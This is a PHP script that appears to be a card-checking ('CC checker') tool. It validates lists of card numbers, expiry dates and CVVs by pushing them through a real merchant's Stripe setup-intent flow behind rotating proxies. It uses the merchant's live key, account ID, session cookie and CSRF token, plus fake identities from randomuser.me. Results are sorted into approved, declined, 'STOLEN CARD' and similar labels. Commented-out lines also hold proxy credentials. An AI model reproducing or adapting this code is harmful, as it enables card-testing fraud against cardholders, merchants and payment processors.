<?php

error_reporting(0);
date_default_timezone_set('America/New_York');

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    $proxySocks4 = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxySocks4) - 1);
    $proxySocks = $proxySocks4[$myproxy];
    return $proxySocks;
}

$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink('cookie.txt');
}

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

$states = array(
    "Alabama" => "AL", "Alaska" => "AK", "Arizona" => "AZ", "California" => "CA",
    "Colorado" => "CO", "Connecticut" => "CT", "Delaware" => "DE", "District of Columbia" => "DC",
    "Florida" => "FL", "Georgia" => "GA", "Hawaii" => "HI", "Idaho" => "ID",
    "Illinois" => "IL", "Indiana" => "IN", "Iowa" => "IA", "Kansas" => "KS",
    "Kentucky" => "KY", "Louisiana" => "LA", "Maine" => "ME", "Maryland" => "MD",
    "Massachusetts" => "MA", "Michigan" => "MI", "Minnesota" => "MN", "Mississippi" => "MS",
    "Missouri" => "MO", "Montana" => "MT", "Nebraska" => "NE", "Nevada" => "NV",
    "New Hampshire" => "NH", "New Jersey" => "NJ", "New Mexico" => "NM", "New York" => "NY",
    "North Carolina" => "NC", "North Dakota" => "ND", "Ohio" => "OH", "Oklahoma" => "OK",
    "Oregon" => "OR", "Pennsylvania" => "PA", "Rhode Island" => "RI", "South Carolina" => "SC",
    "South Dakota" => "SD", "Tennessee" => "TN", "Texas" => "TX", "Utah" => "UT",
    "Vermont" => "VT", "Virginia" => "VA", "Washington" => "WA", "West Virginia" => "WV",
    "Wisconsin" => "WI", "Wyoming" => "WY"
);

$state = isset($states[$state]) ? $states[$state] : "KY";

$ch = curl_init();
///////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
// // $Websharegay = rand(0,250);
// // $rp1 = array(
// //   1 => 'PMaDTXz0cxSUrqQBh-country-any-filter-medium:hnOxcRV22UpVRhR',
// //     ); 
// //     $rotate = $rp1[array_rand($rp1)];
// // //////////////////////////==============[Proxy Section]===============//////////////////////////////
// // $ch = curl_init('https://api.ipify.org/');
// // curl_setopt_array($ch, [
// // CURLOPT_RETURNTRANSFER => true,
// // CURLOPT_PROXY => '135.148.150.32:8080',
// // CURLOPT_PROXYUSERPWD => $rotate,
// // CURLOPT_HTTPGET => true,
// // ]);
// // $ip1 = curl_exec($ch);
// // curl_close($ch);
// // ob_flush();  
// // if (isset($ip1)){
// // $ip = "Live! ✅";
// // }
// // if (empty($ip1)){
// // $ip = "Dead!❌";
// // }
// // echo '[ IP: '.$ip.' ] ';
// ///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
// ////////////////////////////===[2ST CURL]
// ///$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "135.148.150.32:8080"); 
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://manflowyoga.tv/api/billings/setup_intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // not recommended for production
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // not recommended for production

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Accept: application/json',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: en-US,en;q=0.9',
  'Access-Control-Allow-Origin: *',
  'Cookie: user_utm_source=; user_utm_medium=; user_utm_term=; user_utm_content=; user_utm_campaign=; user_referrer=; referer=; country_code=IN; ip_address=49.204.119.141; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F109.0.0.0+Safari%2F537.36; started_at=2023-01-14+06%3A26%3A30+UTC; initialized=true; _gcl_au=1.1.533180083.1673677611; _fbp=fb.1.1673677611354.1410833899; __stripe_mid=73f1db21-e00e-4784-a82f-cb771caf51971201c8; pixel_session=07138f13-779f-4bdd-89b4-a3b95c952143; _ga=GA1.2.1533485430.1673677601; _gid=GA1.2.2066834089.1675917128; _ga_0MEXJ17RRG=GS1.1.1675917126.3.1.1675917207.0.0.0; _uscreen2_session=Y1lYWHFuczJpTFdjdGRHdCt6alcyL0RZMmJSRUd3bU42YTU4SExvRDUyUGx1cFRZbmFGSDkxeUU0RHU0SkFYZ1pCMWtsN0dJTFVXc21OdWFPeGhHR3dXOHVIa2lpZWduV09nVUUzL3ZPL0QyTW03WjVxWStIRmZMSW8rWk5OUDlwdDNnM00rSloyQy9EK2R5VHRzQ3NncmJZWUJ2Qnl1YXJld29nL3gvK0VUVXRPc1k2Njg2WmNMRC9mSGxvWFNKZnFNNFhKQmUzQmoxdHFQSmlLeUFBbUh2V3VlWTAxUzlJRXZ4T2Fpd2FnMWZGWHk3dFA1NXhnYXdpV1MwbWJmdHEzdi96UnZlN1ZTUTkvSG9GY214cXF2NmVGemF3L2VyWFpGRVdVMjlNMjg9LS1lNW5yL0p4SXZxbnp0clA1ZVR6bWlBPT0%3D--55a2ced91a5949c34162fdcea6c21cc2902b31af',
  'DNT: 1',
  'Referer: https://manflowyoga.tv/orders/complete_order?o=43909',
  'Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
  'Sec-Ch-Ua-Mobile: ?0',
  'Sec-Ch-Ua-Platform: "Windows"',
  'Sec-Fetch-Dest: empty',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Site: same-origin',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'X-Csrf-Token: N6WXypI8z2AC9XbaYjZCiPu5AU31l5gPCmrHXznuvzjhcfHFMmkrWqTpsqWWjAyWJ1yVv4C6evJXmEQfNzPIsQ'
));

// If needed, save/load cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL Error: ' . curl_error($ch);
    exit;
}

curl_close($ch);

// Decode JSON, don't echo raw response
$response_data = json_decode($response, true);

if (json_last_error() === JSON_ERROR_NONE && isset($response_data['setup_intent'])) {
    $full_intent = $response_data['setup_intent'];
    $intent_id = explode('_secret_', $full_intent)[0];
} else {
    exit; // Stop if setup intent is invalid
}


//request 2

$intent_id = explode('_secret_', $full_intent)[0];

$url = "https://api.stripe.com/v1/setup_intents/{$intent_id}/confirm";

$ch = curl_init();

// Set form fields properly encoded (NOT JSON)
$postFields = http_build_query([
    'payment_method_data[type]' => 'card',
    'payment_method_data[card][number]' => $cc,
    'payment_method_data[card][cvc]' => $cvv,
    'payment_method_data[card][exp_month]' => $mes,
    'payment_method_data[card][exp_year]' => $ano,
    'payment_method_data[guid]' => 'NA',
    'payment_method_data[muid]' => '73f1db21-e00e-4784-a82f-cb771caf51971201c8',
    'payment_method_data[sid]' => 'NA',
    'payment_method_data[payment_user_agent]' => 'stripe.js/047a5472e; stripe-js-v3/047a5472e',
    'payment_method_data[time_on_page]' => '82965',
    'expected_payment_method_type' => 'card',
    'use_stripe_sdk' => 'true',
    'key' => 'pk_live_DImPqz7QOOyx70XCA9DSifxb',
    '_stripe_account' => 'acct_14oL8mHnpw1Da4AG',
    'client_secret' => $full_intent,
]);

// Set cURL options
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Set headers once and correctly
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Referer: https://js.stripe.com/',
    'Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'Sec-Ch-Ua-Mobile: ?0',
    'Sec-Ch-Ua-Platform: "Windows"',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Accept: application/json',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'DNT: 1',
    'Content-Length: ' . strlen($postFields)
));

// Execute and handle response
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    $result = $response;
}

curl_close($ch);

///$result = curl_exec($ch);



////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){
	
	///if(strpos($result, 'requires_capture')){

  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i></font><br> </i> </font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "requires_capture")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>PREAUTH SUCESS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESS CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESSFULLY AUTHORIZED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "-----BEGIN CERTIFICATE-----" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CCN</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'fraudulent')) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>CCN1</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>LOST CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=3 color='black'><font class='badge badge-light'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font><br> <font class='badge badge-light'";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INCORRECT</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "invalid_cvc" )) {
  echo "<font size=3 color='black'><font class='badge badge-success'>#Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-light'>CVV INVALID</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>STOLEN OR LOST</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_month' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID MONTH</i> </font><br>";
  }
  elseif(strpos($result, 'invalid_expiry_year' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INVALID YEAR</i> </font><br>";
  }
  elseif(strpos($result, 'Unrecognized request URL (POST: /v1/payment_intents//confirm). If you are trying to list objects, remove the trailing slash. If you are trying to retrieve an object, make sure you passed a valid (non-empty) identifier in your code. Please see https://stripe.com/docs or we can help at https://support.stripe.com/."' )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>ERROR IN GATEWAY</i> </font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i> </font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>DO NOT HONOR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result, '"Server Error"')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>SERVER ERROR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>#Reprovadas  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CVC_CHECKED : Fail</i> </font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CARD DETAIL</i> </font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT CHECK</i> </font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Aprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>VBV</i> </font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>3D SECURED</i> </font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i> </font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i> </font><br>";
}
elseif(strpos($result, "MISSING CARD DETAIL")) {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>MISSING DETAILS</i> </font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'verification_url')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>Card Declined...</i> </font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=3 color='black'><font class='badge badge-warning'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
///elseif(strpos($result, '"decline_code": "fraudulent"')) {
  ///echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Fraudulent</i> </font><br>";

else {
  echo "<font size=3 color='black'><font class='badge badge-danger'>#Reprovadas <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='black'><font class='badge badge-danger'>Server Failure/Error Not Listed</i> </font><br>";
}
curl_close($ch);
ob_flush();
///echo $result;

?>
